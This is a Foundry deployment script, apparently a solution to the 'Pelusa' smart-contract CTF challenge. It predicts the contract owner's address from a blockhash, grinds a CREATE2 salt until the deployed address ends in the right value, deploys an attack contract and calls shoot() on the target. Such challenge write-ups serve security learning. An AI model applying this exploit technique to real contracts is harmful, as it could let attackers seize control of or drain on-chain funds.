// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "../src/attacks/PelusaAttack.sol";
import "../src/Pelusa.sol";

contract PelusaScript is Script {
    address constant PELUSA_ADDR = 0xd6c70E24559D6c965348231b061B72Edd2EAc40B;
    address constant FACTORY_CONTRACT = 0xAA758e00ecA745Cab9232b207874999F55481951;
    address constant PLAYER_ADDR = 0xeC09A77427caC13A598C9eD9420AA975bfE17CE9;
    uint256 constant BLOCK_NUMBER = 7951300;
    address constant DEPLOYER = 0x4e59b44847b379578588920cA78FbF26c0B4956C; // Refer issue - https://github.com/foundry-rs/foundry/issues/1999

    address PELUSA_OWNER;

    function getAddress(bytes memory bytecode, uint _salt)
        public
        view
        returns (address)
    {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                DEPLOYER,
                _salt,
                keccak256(bytecode)
            )
        );

        return address(uint160(uint(hash)));
    }

    function findSalt(uint from, uint to) public returns (uint256) {
        bytes memory byteCode = getByteCode();

        for (uint i = from; i < to; i++) {
            address addr = getAddress(byteCode, i);

            if (uint256(uint160(addr)) % 100 == 10) {
                return i;
            }
        }
    }

    function createPelusaAttack(bytes memory _code, uint _salt)
        public
        returns (address)
    {
        address addr;
        assembly {
            addr := create2(callvalue(), add(_code, 0x20), mload(_code), _salt)
            if iszero(extcodesize(addr)) {
                revert(0, 0)
            }
        }
        return addr;
    }

    function getByteCode() public returns (bytes memory) {
        bytes memory bytecode = type(PelusaAttack).creationCode;

        return abi.encodePacked(bytecode, abi.encode(PELUSA_ADDR, PELUSA_OWNER));
    }

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        Pelusa pelusa = Pelusa(PELUSA_ADDR);
        PELUSA_OWNER = address(uint160(uint256(keccak256(abi.encodePacked(FACTORY_CONTRACT, blockhash(BLOCK_NUMBER))))));

        uint256 salt = findSalt(0, 1000);
        console.log("Salt %d", salt);

        bytes memory bytecode = getByteCode();
        console.log("Expected Address: ", getAddress(bytecode, salt));

        address addr = createPelusaAttack(bytecode, salt);

        console.log("Contract Deployed at: ", addr);

        PelusaAttack pelusaAttack = PelusaAttack(addr);

        pelusa.shoot();
        
        vm.stopBroadcast();
    }
}
